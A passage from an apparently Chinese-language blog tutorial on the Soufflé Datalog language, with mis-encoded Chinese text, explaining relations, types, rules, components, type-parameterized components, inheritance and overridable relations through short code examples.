<code>B(x,y) â‡ A(x,y)</code> å’Œ <code>B(x,y) â‡ A(x,y), B(y,z)</code>ã€‚</p><ul><li>Horn Clause çš„è§£é‡Šå¯ä»¥çœ‹ï¼š<a href="http://www.blogjava.net/Javawind/archive/2007/12/12/167108.html">http://www.blogjava.net/Javawind/archive/2007/12/12/167108.html</a></li></ul><p>æœ€åçš„æŒ‡ä»¤ <code>.output B</code> è¡¨ç¤ºåœ¨æ‰§è¡Œç»“æŸæ—¶æŸ¥è¯¢å…³ç³» Bï¼Œå¹¶å°†å…¶å†™å…¥æ–‡ä»¶æˆ–æ‰“å°åˆ°å±å¹•ä¸­ã€‚å…³ç³»å£°æ˜ã€äº‹å®ã€è§„åˆ™å’ŒæŒ‡ä»¤çš„é¡ºåºå¯ä»¥æ˜¯ä»»æ„çš„ï¼Œå¹¶ä¸å½±å“æœ€ç»ˆçš„æ‰§è¡Œã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number, y:number)  // declaration of relation <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>,<span class="number">2</span>).                      // facts of relation <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">2</span>,<span class="number">3</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">B</span>(x:number, y:number)  // declaration of relation <span class="symbol">B</span></span><br><span class="line"><span class="symbol">B</span>(x,y) :- <span class="symbol">A</span>(x,y).            // rules of relation <span class="symbol">B</span></span><br><span class="line"><span class="symbol">B</span>(x,z) :- <span class="symbol">A</span>(x,y), <span class="symbol">B</span>(y,z).</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">B</span>                    // <span class="symbol">Output</span> relation <span class="symbol">B</span> </span><br></pre></td></tr></table></figure><h3 id="å…³ç³»"><a href="#å…³ç³»" class="headerlink" title="å…³ç³»"></a>å…³ç³»</h3><p>SoufflÃ© è¦æ±‚å£°æ˜å…³ç³»ï¼Œå…³ç³»æ˜¯ä¸€ç»„æœ‰æœ‰åºå…ƒç»„ <code>(x1, ..., xk)</code>ï¼Œå…¶ä¸­æ¯ä¸ªå…ƒç´  <code>xi</code> éƒ½æ˜¯ç”±ç±»å‹å®šä¹‰çš„æ•°æ®åŸŸçš„æˆå‘˜ã€‚ä»¥ä¸‹å£°æ˜å®šä¹‰äº†ä»…åŒ…å«æ•°å­—å¯¹çš„å…³ç³» Aï¼Œç¬¬ä¸€ä¸ªå±æ€§è¢«å‘½åä¸º xï¼Œç¬¬äºŒä¸ªå±æ€§è¢«å‘½åä¸º yï¼Œä¸¤ä¸ªå±æ€§çš„ç±»å‹éƒ½æ˜¯æ•°å­—ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number, y:number).</span><br></pre></td></tr></table></figure><p>SoufflÃ© çš„ç±»å‹æ£€æŸ¥å™¨å°†æ¨æ–­è§„åˆ™ä¸­çš„å˜é‡ç±»å‹ï¼Œå¹¶æ£€æŸ¥å®ƒä»¬æ˜¯å¦æ­£ç¡®ä½¿ç”¨ã€‚</p><h3 id="ç±»å‹"><a href="#ç±»å‹" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h3><p>SoufflÃ© åˆ©ç”¨ç±»å‹åŒ–çš„ Datalog æ–¹è¨€è¿›è¡Œé™æ€æ£€æŸ¥ï¼Œä»è€Œèƒ½å¤Ÿææ—©å‘ç°æŸ¥è¯¢è§„èŒƒä¸­çš„é”™è¯¯ã€‚å¿…é¡»ä¸ºå…³ç³»çš„ä»»ä½•å±æ€§æŒ‡å®šç±»å‹ï¼ŒSoufflÃ© ä¸­æœ‰å››ç§åŸå§‹ç±»å‹ï¼šç¬¦å·ï¼ˆ<code>symbol</code>ï¼‰ã€æ•°å­—ï¼ˆ<code>number</code>ï¼‰ã€æ— ç¬¦å·æ•°å­—ï¼ˆ<code>unsigned</code>ï¼‰ã€æµ®ç‚¹æ•°ï¼ˆ<code>float</code>ï¼‰ã€‚</p><h3 id="è§„åˆ™"><a href="#è§„åˆ™" class="headerlink" title="è§„åˆ™"></a>è§„åˆ™</h3><p>è§„åˆ™æ˜¯æ¡ä»¶é€»è¾‘è¯­å¥ï¼Œä»¥å¤´éƒ¨å¼€å§‹ï¼Œç„¶åæ˜¯èº«ä½“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€å¯¹ (x, y) åœ¨ B ä¸­åˆ™ A æˆç«‹ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">A</span>(x,y) :- <span class="symbol">B</span>(x,y).</span><br></pre></td></tr></table></figure><h3 id="ç»„ä»¶"><a href="#ç»„ä»¶" class="headerlink" title="ç»„ä»¶"></a>ç»„ä»¶</h3><p>SoufflÃ© æœ‰ç»„ä»¶è¿™ä¸ªæ¦‚å¿µï¼Œå¯ç”¨äºæ¨¡å—åŒ–å¤§å‹é€»è¾‘ç¨‹åºã€‚ä¸€ä¸ªç»„ä»¶å¯èƒ½åŒ…å«å…¶ä»–ç»„ä»¶ã€å…³ç³»ã€ç±»å‹å£°æ˜ã€äº‹å®ã€è§„åˆ™å’ŒæŒ‡ä»¤ï¼›ç»„ä»¶å¿…é¡»å£°æ˜å’Œå®ä¾‹åŒ–åæ‰å¯ä»¥ä½¿ç”¨ï¼Œæ¯ä¸ªç»„ä»¶éƒ½æœ‰è‡ªå·±çš„å‘½åç©ºé—´ï¼›ç»„ä»¶å¯ä»¥ç»§æ‰¿ä¸€ä¸ªæˆ–å¤šä¸ªè¶…çº§ç»„ä»¶ã€‚</p><h3 id="ç”¨æˆ·å®šä¹‰å‡½å­"><a href="#ç”¨æˆ·å®šä¹‰å‡½å­" class="headerlink" title="ç”¨æˆ·å®šä¹‰å‡½å­"></a>ç”¨æˆ·å®šä¹‰å‡½å­</h3><p>å¯ä»¥ä½¿ç”¨ç”¨æˆ·å®šä¹‰å‡½å­æ‰©å±• SoufflÃ©ï¼Œç”¨æˆ·å®šä¹‰å‡½å­ç”¨ C/C++ å®ç°ã€‚ç”¨æˆ·å®šä¹‰å‡½å­æœ‰ä¸¤ç§é£æ ¼ï¼šæœ´ç´ å‡½å­å’Œæœ‰çŠ¶æ€çš„å‡½å­ï¼Œæœ‰çŠ¶æ€çš„å‡½å­å…¬å¼€è®°å½•å’Œç¬¦å·è¡¨ã€‚</p><h3 id="ç¼–è¯‘æŒ‡ä»¤"><a href="#ç¼–è¯‘æŒ‡ä»¤" class="headerlink" title="ç¼–è¯‘æŒ‡ä»¤"></a>ç¼–è¯‘æŒ‡ä»¤</h3><p>ç”¨ç¼–è¯‘æŒ‡ä»¤é…ç½® SoufflÃ©ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥åœ¨æºç ä¸­è®¾ç½®å‘½ä»¤è¡Œé€‰é¡¹ã€‚</p><h2 id="ç»„ä»¶-Components"><a href="#ç»„ä»¶-Components" class="headerlink" title="ç»„ä»¶ Components"></a>ç»„ä»¶ Components</h2><p>ç»„ä»¶æ˜¯ç¨‹åºçš„æ¨¡å—åŒ–éƒ¨åˆ†ï¼Œå¯ä»¥å°è£…å…ƒç´ ï¼ŒåŒ…æ‹¬å…³ç³»å£°æ˜ã€ç±»å‹å£°æ˜ã€è§„åˆ™ã€äº‹å®ã€æŒ‡ä»¤å’Œå…¶ä»–ç»„ä»¶ã€‚ç»„ä»¶åŒ…å«å£°æ˜å’Œå®ä¾‹åŒ–ä¸¤ä¸ªæ“ä½œã€‚</p><p>ä½¿ç”¨ <code>.comp</code> å…³é”®å­—å£°æ˜ç»„ä»¶ï¼Œç»„ä»¶åŒ…å«çš„å…ƒç´ å®šä¹‰åœ¨ <code>&#123;...&#125;</code> å†…ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">MyComponent</span> &#123;</span><br><span class="line">    .type myType = number        // type</span><br><span class="line">    .decl <span class="symbol">TheAnswer</span>(x:myType)    // component relation</span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // component fact</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>.init</code> å…³é”®å­—åˆå§‹åŒ–ç»„ä»¶ï¼Œåœ¨å†…éƒ¨ï¼ŒSoufflÃ© å°†ç»„ä»¶å®ä¾‹æ‰å¹³åŒ–ï¼ˆflattenï¼‰ï¼Œå¹¶ä¸ºæ¯ä¸ªç»„ä»¶å®ä¾‹åˆ›å»ºå‘½åç©ºé—´ï¼Œå› æ­¤è¦ç”¨é™å®šåç§°è°ƒç”¨å…¶ä¸­çš„å…ƒç´ ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.init myInstance1 = <span class="symbol">MyComponent</span>         // å®ä¾‹åŒ–</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x).    // . é™å®š</span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>å¯¹äºä¸Šé¢çš„ä¾‹å­ï¼ŒSoufflÃ© åœ¨å†…éƒ¨å¯¹ç»„ä»¶å®ä¾‹è¿›è¡Œäº†å¦‚ä¸‹æ‰©å±•ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.type myInstance1.myType = number</span><br><span class="line">.decl myInstance1.<span class="symbol">TheAnswer</span>(x:myType)    // relation of myInstance1</span><br><span class="line">myInstance1.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // fact of myInstance1</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x).</span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ <code>souffle --show=transformed-datalog xxx.dl &gt; expansion.dl</code> ç”Ÿæˆæ‰©å±•åçš„ datalog æ–‡ä»¶ã€‚</p><p>ä¸‹é¢å®šä¹‰äº†ä¸¤ä¸ª MyComponent å®ä¾‹ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.init myInstance1 = <span class="symbol">MyComponent</span></span><br><span class="line">.init myInstance2 = <span class="symbol">MyComponent</span></span><br><span class="line">myInstance2.<span class="symbol">TheAnswer</span>(<span class="number">33</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x). </span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance2.<span class="symbol">TheAnswer</span>(x). </span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>SoufflÃ© åœ¨å†…éƒ¨ç”Ÿæˆä»¥ä¸‹é€»è¾‘ç¨‹åºï¼Œé€šè¿‡å‰ç¼€é¿å…åç§°å†²çªï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.type myInstance1.myType = number</span><br><span class="line">.decl myInstance1.<span class="symbol">TheAnswer</span>(x:myType)    // relation of myInstance1</span><br><span class="line">myInstance1.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // fact of myInstance1</span><br><span class="line">.type myInstance2.myType = number</span><br><span class="line">.decl myInstance2.<span class="symbol">TheAnswer</span>(x:myType)    // relation of myInstance1</span><br><span class="line">myInstance2.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // fact of myInstance1</span><br><span class="line">myInstance2.<span class="symbol">TheAnswer</span>(<span class="number">33</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Test</span>(x:number)</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance1.<span class="symbol">TheAnswer</span>(x).</span><br><span class="line"><span class="symbol">Test</span>(x) :- myInstance2.<span class="symbol">TheAnswer</span>(x).</span><br><span class="line">.output <span class="symbol">Test</span></span><br></pre></td></tr></table></figure><p>å¦‚æœè§„åˆ™/äº‹å®åœ¨æ²¡æœ‰å…³ç³»å£°æ˜çš„ç»„ä»¶ä¸­å®šä¹‰ï¼ŒSoufflÃ© ä¸ä¼šé¢„å…ˆæ·»åŠ å‰ç¼€ï¼Œè€Œæ˜¯ä¼šå°†è§£ææ¨è¿Ÿåˆ°å®é™…çš„ç»„ä»¶å®ä¾‹åŒ–ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Out</span>(x:number) </span><br><span class="line">.comp <span class="symbol">A</span> &#123; </span><br><span class="line">   .decl <span class="symbol">R</span>(x:number) </span><br><span class="line">   .comp <span class="symbol">Count</span> &#123;              // åœ¨ç»„ä»¶å†…éƒ¨å®šä¹‰ç»„ä»¶</span><br><span class="line">       <span class="symbol">R</span>(<span class="number">1</span>).                  // fact accessing <span class="symbol">R</span> outside of <span class="symbol">Count</span></span><br><span class="line">       <span class="symbol">R</span>(x+<span class="number">1</span>):- <span class="symbol">R</span>(x), x&lt;<span class="number">10.</span>   // rule accessing <span class="symbol">R</span> outside of <span class="symbol">Count</span></span><br><span class="line">   &#125; </span><br><span class="line">   .init myCount = <span class="symbol">Count</span>      // instantiate <span class="symbol">Count</span></span><br><span class="line">   <span class="symbol">Out</span>(x) :- <span class="symbol">R</span>(x).            // rule accessing <span class="symbol">Out</span> outside of <span class="symbol">A</span> </span><br><span class="line">&#125;</span><br><span class="line">.init myA = <span class="symbol">A</span></span><br><span class="line">.output <span class="symbol">Out</span></span><br></pre></td></tr></table></figure><p>SoufflÃ© ä¼šå°†ä»£ç æ‰©å±•ï¼Œå®é™…ä¼šæ˜¯è¿™æ ·ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Out</span>(x:number) </span><br><span class="line">.decl myA.<span class="symbol">R</span>(x:number) </span><br><span class="line">myA.<span class="symbol">R</span>(<span class="number">1</span>).</span><br><span class="line">myA.<span class="symbol">R</span>((x+<span class="number">1</span>)) :- myA.<span class="symbol">R</span>(x), x &lt; <span class="number">10.</span></span><br><span class="line"><span class="symbol">Out</span>(x) :- </span><br><span class="line">   myA.<span class="symbol">R</span>(x).</span><br><span class="line">.output <span class="symbol">Out</span></span><br></pre></td></tr></table></figure><p>å¦‚æœè§„åˆ™å’Œäº‹å®åœ¨æœ¬åœ°ä½œç”¨åŸŸä¸­è¢«å®ä¾‹åŒ–ï¼Œé‚£ä¹ˆå‰ç¼€å°†è¢«é¢„å…ˆæ·»åŠ åˆ°å‰é¢ã€‚</p><h3 id="ç±»å‹å‚æ•°åŒ–"><a href="#ç±»å‹å‚æ•°åŒ–" class="headerlink" title="ç±»å‹å‚æ•°åŒ–"></a>ç±»å‹å‚æ•°åŒ–</h3><p>ç»„ä»¶å¯ä»¥é€šè¿‡æœªé™å®šçš„ç±»å‹åç§°è¿›è¡Œå‚æ•°åŒ–ï¼Œä¸‹é¢çš„ä¾‹å­å®ä¾‹åŒ–äº†ä¸¤ä¸ªä¸åŒçš„ç±»å‹çš„ç»„ä»¶ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">ParamComponent</span>&lt;myType&gt; &#123;</span><br><span class="line">    .decl <span class="symbol">TheAnswer</span>(x:myType)    // component relation</span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">42</span>).               // component fact</span><br><span class="line">    .output <span class="symbol">TheAnswer</span>            // component output directive</span><br><span class="line">&#125;</span><br><span class="line">.init numberInstance = <span class="symbol">ParamComponent</span>&lt;number&gt;</span><br><span class="line">.init floatInstance = <span class="symbol">ParamComponent</span>&lt;float&gt;</span><br></pre></td></tr></table></figure><p>åœ¨å†…éƒ¨ï¼ŒSoufflÃ© å°†æ˜¾å¼å®ä¾‹åŒ–ä¸åŒå±æ€§çš„ç»„ä»¶ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl numberInstance.<span class="symbol">TheAnswer</span>(x:number)     // relation of numberInstance</span><br><span class="line">numberInstance.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).                // fact of numberInstance</span><br><span class="line">.output numberInstance.<span class="symbol">TheAnswer</span>             // output directive of numberInstance</span><br><span class="line"></span><br><span class="line">.decl floatInstance.<span class="symbol">TheAnswer</span>(x:float)       // relation of floatInstance</span><br><span class="line">floatInstance.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).                 // fact of floatInstance</span><br><span class="line">.output floatInstance.<span class="symbol">TheAnswer</span>              // output directive of floatInstance</span><br></pre></td></tr></table></figure><p>ç»„ä»¶åç§°ä¹Ÿå¯ä»¥ç”¨å‚æ•°ä¼ é€’ï¼Œä¾‹å¦‚ï¼Œå®ä¾‹åŒ–æ—¶æŒ‡å®šç”Ÿæˆç»„ä»¶ Oneï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">R</span>(x:number)</span><br><span class="line">.comp <span class="symbol">Case</span>&lt;<span class="symbol">Selector</span>&gt; &#123;</span><br><span class="line">   .comp <span class="symbol">One</span> &#123; </span><br><span class="line">     <span class="symbol">R</span>(<span class="number">1</span>). </span><br><span class="line">   &#125; </span><br><span class="line">   .comp <span class="symbol">Two</span> &#123; </span><br><span class="line">     <span class="symbol">R</span>(<span class="number">2</span>).</span><br><span class="line">   &#125; </span><br><span class="line">   .init selection = <span class="symbol">Selector</span> // instantiation depending on type parameter <span class="string">&quot;Selector&quot;</span> </span><br><span class="line">&#125; </span><br><span class="line">.init myCase = <span class="symbol">Case</span>&lt;<span class="symbol">One</span>&gt; </span><br><span class="line">.output <span class="symbol">R</span></span><br></pre></td></tr></table></figure><p>åœ¨å†…éƒ¨å°†ç”Ÿæˆä»¥ä¸‹ç¨‹åºï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">R</span>(x:number) </span><br><span class="line"><span class="symbol">R</span>(<span class="number">1</span>). </span><br><span class="line">.output <span class="symbol">R</span></span><br></pre></td></tr></table></figure><h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><p>ä¸€ä¸ªç»„ä»¶å¯ä»¥ç»§æ‰¿å¤šä¸ªè¶…çº§ç»„ä»¶ï¼Œè¶…çº§ç»„ä»¶çš„å…ƒç´ å°†è¢«ä¼ é€’ç»™å­ç»„ä»¶ã€‚ä½¿ç”¨ <code>:</code> ç»§æ‰¿è¶…çº§ç»„ä»¶ï¼Œç”¨ <code>,</code> åˆ†éš”ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">Base1</span> &#123;</span><br><span class="line">    .type myNumber = number</span><br><span class="line">    .decl <span class="symbol">TheAnswer</span>(x:myNumber)</span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">42</span>).</span><br><span class="line">&#125;</span><br><span class="line">.comp <span class="symbol">Base2</span> &#123; </span><br><span class="line">    <span class="symbol">TheAnswer</span>(<span class="number">41</span>). </span><br><span class="line">&#125;</span><br><span class="line">.comp <span class="symbol">Sub</span>  : <span class="symbol">Base1</span>, <span class="symbol">Base2</span> &#123; // inherit from <span class="symbol">Base1</span> and <span class="symbol">Base2</span></span><br><span class="line">    .decl <span class="symbol">WhatIsTheAnswer</span>(n:myNumber)</span><br><span class="line">    <span class="symbol">WhatIsTheAnswer</span>(n) :- <span class="symbol">TheAnswer</span>(n).</span><br><span class="line">    .output <span class="symbol">WhatIsTheAnswer</span></span><br><span class="line">&#125;</span><br><span class="line">.init mySub = <span class="symbol">Sub</span></span><br></pre></td></tr></table></figure><p>ç»„ä»¶ Base1 å’Œ Base2 å°†æ‰€æœ‰ç»„ä»¶å…ƒç´ ä¼ é€’ç»™å­ç»„ä»¶ Subï¼Œåœ¨å†…éƒ¨å®ä¾‹åŒ– mySub æ—¶ç”Ÿæˆä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.type mySub.myNumber = number</span><br><span class="line">.decl mySub.<span class="symbol">TheAnswer</span>(x:mySub.myNumber) </span><br><span class="line">.decl mySub.<span class="symbol">WhatIsTheAnswer</span>(n:mySub.myNumber) </span><br><span class="line">mySub.<span class="symbol">TheAnswer</span>(<span class="number">42</span>).</span><br><span class="line">mySub.<span class="symbol">TheAnswer</span>(<span class="number">41</span>).</span><br><span class="line">mySub.<span class="symbol">WhatIsTheAnswer</span>(n) :- mySub.<span class="symbol">TheAnswer</span>(n).</span><br><span class="line">.output mySub.<span class="symbol">WhatIsTheAnswer</span></span><br></pre></td></tr></table></figure><h3 id="å¯é‡å†™çš„å…³ç³»"><a href="#å¯é‡å†™çš„å…³ç³»" class="headerlink" title="å¯é‡å†™çš„å…³ç³»"></a>å¯é‡å†™çš„å…³ç³»</h3><p>å¦‚æœåœ¨è¶…çº§ç»„ä»¶ä¸­å°†å…³ç³»å£°æ˜ä¸ºå¯è¦†ç›–ï¼ˆ<code>overridable</code>ï¼‰ï¼Œåˆ™å­ç»„ä»¶å¯ä»¥é‡å†™å…³è”çš„è§„åˆ™å’Œäº‹å®ã€‚ä¾‹å¦‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">Base</span> &#123;</span><br><span class="line">    .decl <span class="symbol">R</span>(x:number) overridable</span><br><span class="line">    <span class="symbol">R</span>(<span class="number">1</span>).</span><br><span class="line">    <span class="symbol">R</span>(x+<span class="number">1</span>) :- <span class="symbol">R</span>(x), x &lt; <span class="number">5.</span> </span><br><span class="line">    .output <span class="symbol">R</span></span><br><span class="line">&#125;</span><br><span class="line">.comp <span class="symbol">Sub</span> : <span class="symbol">Base</span> &#123;</span><br><span class="line">    .override <span class="symbol">R</span></span><br><span class="line">    <span class="symbol">R</span>(<span class="number">2</span>).</span><br><span class="line">    <span class="symbol">R</span>(x+<span class="number">1</span>) :- <span class="symbol">R</span>(x), x &lt; <span class="number">4.</span> </span><br><span class="line">&#125;</span><br><span class="line">.init mySub = <span class="symbol">Sub</span></span><br></pre></td></tr></table></figure><p>å­ç»„ä»¶ä¸¢å¼ƒäº‹å® <code>R(1).</code> å’Œè§„åˆ™ <code>R(x+1) :- R(x), x &lt; 5.</code>ï¼Œç„¶åè¿›è¡Œé‡å†™ï¼Œåœ¨å†…éƒ¨å®ä¾‹åŒ– mySub æ—¶ç”Ÿæˆä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.decl mySub.<span class="symbol">R</span>(x:number)overridable </span><br><span class="line">mySub.<span class="symbol">R</span>(<span class="number">2</span>).</span><br><span class="line">mySub.<span class="symbol">R</span>((x+<span class="number">1</span>)) :- </span><br><span class="line">   mySub.<span class="symbol">R</span>(x),</span><br><span class="line">   x &lt; <span class="number">4.</span></span><br><span class="line">.output mySub.<span class="symbol">R</span></span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œå¯ä»¥ç”¨ PrecisePointsto ç»§æ‰¿å’Œè¦†ç›– AbstractPointsto çš„ HeapAllocationMerge å…³ç³»ï¼Œå®ç°æ›´ç²¾ç¡®çš„åˆ†æï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">AbstractPointsto</span>&#123;</span><br><span class="line">    .decl <span class="symbol">HeapAllocationMerge</span>(heap,mergeHeap) overridable</span><br><span class="line">    <span class="symbol">HeapAllocationMerge</span>(heap,<span class="string">&quot;&lt;&lt;string-constant&gt;&gt;&quot;</span>) :-</span><br><span class="line">        <span class="symbol">StringConstant</span>(heap).</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.comp <span class="symbol">PrecisePointsto</span> : <span class="symbol">AbstractPointsto</span>&#123;   // ç»§æ‰¿</span><br><span class="line">    .override <span class="symbol">HeapAllocationMerge</span>           // è¦†ç›–</span><br><span class="line">    <span class="symbol">HeapAllocationMerge</span>(heap,<span class="string">&quot;&lt;&lt;string-constant&gt;&gt;&quot;</span>) :-</span><br><span class="line">        <span class="symbol">StringConstant</span>(heap),</span><br><span class="line">        !<span class="symbol">ClassNameStringConstant</span>(heap),</span><br><span class="line">        !<span class="symbol">SimpleNameStringConstant</span>(heap).</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.init precise_pointsto = <span class="symbol">PrecisePointsto</span></span><br></pre></td></tr></table></figure><h3 id="ç±»å‹å‚æ•°åŒ–å’Œç»§æ‰¿"><a href="#ç±»å‹å‚æ•°åŒ–å’Œç»§æ‰¿" class="headerlink" title="ç±»å‹å‚æ•°åŒ–å’Œç»§æ‰¿"></a>ç±»å‹å‚æ•°åŒ–å’Œç»§æ‰¿</h3><p>è¶…çº§ç»„ä»¶çš„ç±»å‹å‚æ•°å¯ä»¥åœ¨å­ç»„ä»¶å£°æ˜ä¸­æ˜ç¡®æŒ‡å®šï¼Œä¸‹é¢å®šä¹‰äº†ä¸€ä¸ªå¸¦å‚æ•° K çš„å­ç»„ä»¶ Bï¼Œç”¨äºå®ä¾‹åŒ–å¸¦å‚æ•° K çš„è¶…ç»„ä»¶ Aï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">A</span>&lt;<span class="symbol">T</span>&gt; &#123; .... &#125;</span><br><span class="line">.comp <span class="symbol">B</span>&lt;<span class="symbol">K</span>&gt; : <span class="symbol">A</span>&lt;<span class="symbol">K</span>&gt; &#123; ... 